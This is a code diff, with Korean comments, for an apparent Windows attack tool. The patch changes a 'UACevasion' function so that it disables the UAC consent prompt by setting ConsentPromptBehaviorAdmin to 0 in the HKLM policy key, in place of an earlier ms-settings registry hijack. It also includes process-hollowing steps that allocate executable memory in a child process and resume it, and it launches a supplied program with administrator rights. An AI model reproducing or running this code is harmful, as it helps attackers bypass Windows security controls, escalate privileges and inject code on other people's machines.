@@ -34,20 +34,20 @@ BOOL RunAsAdmin(HWND hWnd, LPTSTR lpFile, LPTSTR lpParameters)
 	return TRUE;
 }
 
-
-//UAC 우회를 위한 레지값 수정 함수 UACevasion(HKEY_LOCAL_MACHINE,"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\Command","관리자권한으로 실행시킬 프로그램 경로")
-BOOL UACevasion(HKEY hKeyRoot, const char* lpSubKey, char* setVal) {
+//UAC 우회를 위한 레지값 수정 함수
+BOOL UACevasion() {
 	HKEY hKey = nullptr;
-	LONG ret = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey); //오픈이 됨 → ERROR_SUCCESS 반환. 
+	DWORD dwValue = 0;
+	LONG ret = RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", &hKey);
 	if (ret == ERROR_SUCCESS) {
-		RegCloseKey(hKey); //핸들닫고 리턴 
-		return TRUE;
+		RegSetValueEx(hKey, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, (CONST BYTE*) & dwValue, sizeof(DWORD));
 	}
-	RegSetValueEx(hKey, lpSubKey, 0, REG_SZ, (BYTE*)setVal, (DWORD)sizeof(setVal));
-	
-	return true;
-}
+	else {
+		printf("\nUAC우회실패 \n");
+	}
 
+	return false;
+}
 
 int main(int argc, char* argv[]) {
 	PIMAGE_DOS_HEADER pDosH;
@@ -127,7 +127,7 @@ int main(int argc, char* argv[]) {
 	printf("\n자식프로세스 안에 메모리를 할당한다 치직 \n");
 	mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!mem) {
-		printf("\nVirtualAllocEx false... \n");
+		printf("\nVirtualAllocEx false... %d \n",GetLastError());
 		NtTerminateProcess(pi.hProcess, 1);
 		return 1;
 	}
@@ -158,8 +158,8 @@ int main(int argc, char* argv[]) {
 	NtResumeThread(pi.hThread, NULL);
 
 	printf("\nUAC 우회시작. \n");
-	UACevasion(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command", argv[3]); //argv[3]은 실행시킬 프로그램
-	//RunAsAdmin(NULL,(LPTSTR)"evasion.exe", argv[3]);
+	UACevasion();
+	RunAsAdmin(NULL,(LPTSTR)argv[3],0);
 
 
 	printf("\n후. 자식프로세스가 종료되기를 기다린다..\n");
